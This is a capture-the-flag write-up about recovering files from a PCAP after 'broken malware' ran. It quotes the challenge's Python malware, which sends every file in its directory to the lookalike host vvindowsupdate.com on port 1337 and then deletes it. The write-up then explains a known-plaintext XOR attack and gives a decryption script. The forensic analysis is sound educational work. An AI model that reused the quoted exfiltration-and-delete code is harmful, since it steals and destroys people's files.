# 1337 Malware Writeup

## The Malware

This challenge gives users a PCAP and instructs them to try and recover files lost to "broken malware". Downloading the PCAP, you can easily find the malware script by looking at the first TCP stream (and only HTTP stream). Reading the python code, you can reverse engineer that the malware takes each file in the current directory, encrypts it with an XOR key, sends the file to a remote server, then deletes the file. However, the XOR key is randomly generated by the script, and a comment indicates that this was done by mistake (by the supposed hacker).

```python
import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = randbytes(32)

def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted

def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    data = open(filename, 'rb').read()
    s.sendall(data)
    s.close()

def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)      
    return file_paths

files = get_all_files()
for f in files:
    send_encrypted(f)
    os.remove(f)
```

Further investigating the PCAP, you can find the files sent by the malware (helpfully written out by name each time) by iterating through subsequesnt TCP streams. Using wireshark's follow TCP stream function or using T-Shark, you can pull out and save each encrypted file.

## Reverse Engineering the Key

The key is randomly generated, which is usually a bad thing. However, notice that the encryption is a simple XOR. This is weak because XOR is reversable if you have any two of the three elements (if A XOR B = C, then C xor A = B). In our case, if plaintext xor key = ciphertext, then ciphertext xor plaintext = key. If only we knew the plaintext... we do! The malware helpfully lists the file name of each encrypted file sent, and one of those files is an ssh private key (id_rsa). Assuming it's the standard format of an ssh private key, there is a set of known bytes at the beginning of the key ("-----BEGIN OPENSSH PRIVATE KEY-----"). Since we know some of the plaintext, and the key is smaller than the known plaintext, we can use XOR on the plaintext and the encrypted file to derive the key (a known plaintext attack in cryptography).

This script will find the key and decrypt the files (note I pulled out the encrypted files and named them "encrypted/{filename}\_enc.raw)". You need the following files:

1. id_rsa used to reverse the XOR key
2. Resources.zip to get the flag
3. Welcome Aboard.pdf to get the password to the zip file


```python
from pwn import xor
import os

# Get first 32 bytes of encrypetd private key
enc = open('encrypted/id_rsa_enc.raw', 'rb').read(32)
print('First 32 bytes of encrypted key:')
print(enc)

# first 32 bytes of private key (from wikipedia)
priv_header = b'\x2D\x2D\x2D\x2D\x2D\x42\x45\x47\x49\x4E\x20\x4F\x50\x45\x4E\x53\x53\x48\x20\x50\x52\x49\x56\x41\x54\x45\x20\x4B\x45\x59\x2D\x2D'

# Uses the fact that XOR is it's own inverse (if A xor B = C, then A xor C = B)
key = xor(enc, priv_header)
print('Decrypted key:')
print(key)

os.makedirs('decrypted', exist_ok=True)

# Decrypt Resoucres ZIP
full_data = open('encrypted/resources_zip_enc.raw', 'rb').read()
decrypted = xor(full_data, key)
with open('decrypted/resources.zip', 'wb') as f:
    f.write(decrypted)

# Decrypt PDF w/ password
full_data = open('encrypted/welcome_aboard_pdf_enc.raw', 'rb').read()
decrypted = xor(full_data, key)
with open('decrypted/Welcome Aboard.pdf', 'wb') as f:
    f.write(decrypted)
```

## Getting the Flag

Once the files are decrypted, the password to the zip file can be found in the PDF file. Unzipping the archive with the password will reveal the flag for the challenge.